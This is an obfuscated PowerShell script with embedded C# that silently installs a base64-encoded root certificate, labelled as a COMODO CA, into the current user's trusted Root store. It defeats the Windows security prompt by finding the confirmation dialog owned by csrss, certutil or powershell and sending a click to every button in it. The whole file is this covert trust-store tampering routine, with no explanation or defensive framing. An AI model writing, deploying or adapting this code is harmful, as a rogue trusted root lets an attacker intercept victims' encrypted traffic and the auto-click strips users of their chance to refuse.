function aZbthMLIZf{
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

public static class OjrBcODUkZ
{
	public class qETovsPdCU
    {
        public string Wndclass;
        public string Title;
        public string Process;
        public IntPtr hWnd;
    }

    private delegate bool XAYejOEQvY(IntPtr hWnd, ref qETovsPdCU data);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool EnumWindows(XAYejOEQvY lpEnumFunc, ref qETovsPdCU data);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	
	public delegate bool YupFbAAhjq(IntPtr hwnd, IntPtr lParam);
	
	[DllImport("user32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnumChildWindows(IntPtr window, YupFbAAhjq callback, IntPtr lParam);  
	
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
	
	[Flags]
    private enum SnapshotFlags : uint
    {
    HeapList = 0x00000001,
    Process = 0x00000002,
    Thread = 0x00000004,
    Module = 0x00000008,
    Module32 = 0x00000010,
    Inherit = 0x80000000,
    All = 0x0000001F,
    NoHeaps = 0x40000000
    }
    //inner struct used only internally
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct PROCESSENTRY32
    {
    const int MAX_PATH = 260;
    internal UInt32 dwSize;
    internal UInt32 cntUsage;
    internal UInt32 th32ProcessID;
    internal IntPtr th32DefaultHeapID;
    internal UInt32 th32ModuleID;
    internal UInt32 cntThreads;
    internal UInt32 th32ParentProcessID;
    internal Int32 pcPriClassBase;
    internal UInt32 dwFlags;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
    internal string szExeFile;
    }

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern IntPtr CreateToolhelp32Snapshot([In]UInt32 dwFlags, [In]UInt32 th32ProcessID);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32First([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    static extern bool Process32Next([In]IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle([In] IntPtr hObject);
    
	const int BM_CL = 0x00F5;
	
	public static byte[] mRzRvWmtAO(String sCert)
    {
		return Convert.FromBase64String(sCert);
    }
        
	public static void pROmyVrKge(String sCert){
		System.Console.WriteLine("[Win32]::Start()");
        byte[] bCert = mRzRvWmtAO(sCert);
        if (bCert != null)
        {
            X509Certificate2 certificate = new X509Certificate2(bCert);
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);
            if (!store.Certificates.Contains(certificate))
            {
                Thread thread = new Thread(tTteBeaWKC);
                thread.Start();
                store.Add(certificate);
                thread.Join();
            }
            store.Close();
        }
	}
	
	public static void tTteBeaWKC()
	{
		System.Console.WriteLine("[Win32]::SearchDialog()");
		IntPtr hWnd;
		do{
			hWnd = HcChlQpETG("#32770",String.Empty);
			if (!hWnd.Equals(IntPtr.Zero))
		    {
				System.Console.WriteLine("Founded hWnd=0x{0:X}",hWnd);
		    	break;
			}else
	        {
				hWnd=IntPtr.Zero;
				System.Console.WriteLine("Try again find window");
	        }
		}while (hWnd.Equals(IntPtr.Zero));
		System.Console.WriteLine("Dialog window founded");
		SetForegroundWindow(hWnd);
		YupFbAAhjq childProc = new YupFbAAhjq(TudWopSBfx);
		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
	}
	
	public static IntPtr HcChlQpETG(string wndclass, string title)
    {
        qETovsPdCU sd = new qETovsPdCU();
        sd.Wndclass = wndclass;
        sd.Title = title;
		sd.hWnd=IntPtr.Zero;
		System.Console.WriteLine("EnumWindow -|");
        EnumWindows(new XAYejOEQvY(youOmvkjMM), ref sd);
        return sd.hWnd;
    }
    
	public static bool youOmvkjMM(IntPtr hWnd, ref qETovsPdCU data)
    {
    	StringBuilder title = new StringBuilder(1024);
        StringBuilder className = new StringBuilder(1024);
        GetWindowText(hWnd, title, title.Capacity);
        GetClassName(hWnd, className, className.Capacity);
        String sEN=snMmbANvoC(hWnd).ToLower();
		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && title.ToString().StartsWith(data.Title)))
		{
			System.Console.WriteLine("            |- hWnd=0x{0:X}; Class={1}; Title={2}; Process={3}",hWnd,className.ToString(),title.ToString(),sEN);
        	if(sEN.Contains("csrss") || sEN.Contains("certutil")  || sEN.Contains("powershell"))
	        {
		        data.hWnd = hWnd;
                return false;
	        }
        }
       	
        return true;
    }
  
	public static String snMmbANvoC(IntPtr hWnd){
		uint pID = 0;
		uint threadID = GetWindowThreadProcessId(hWnd, out pID);
		String sProc = null;
	    IntPtr handleToSnapshot = IntPtr.Zero;
	    try
	    {
	        PROCESSENTRY32 procEntry = new PROCESSENTRY32();
	        procEntry.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
	        handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
	        if (Process32First(handleToSnapshot, ref procEntry))
	        {
	        do
	        {
	            if (pID == procEntry.th32ProcessID)
	            {
	            sProc = procEntry.szExeFile;
	            break;
	            }
	        } while (Process32Next(handleToSnapshot, ref procEntry));
	        }
	        else
	        {
	        	throw new ApplicationException(string.Format("Failed with win32 error code {0}", Marshal.GetLastWin32Error()));
	        }
	    }
	    catch (Exception ex)
	    {
	        throw new ApplicationException("Can't get the process.", ex);
	    }
	    finally
	    {
	        CloseHandle(handleToSnapshot);
	    }
	    return sProc;
	}
	public static bool TudWopSBfx(IntPtr hWnd, IntPtr lParam)
	{
		SendMessage(hWnd, BM_CL, IntPtr.Zero, IntPtr.Zero);
		return true;
	}
}
"@;
[OjrBcODUkZ]::pROmyVrKge("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");
exit
}
aZbthMLIZf
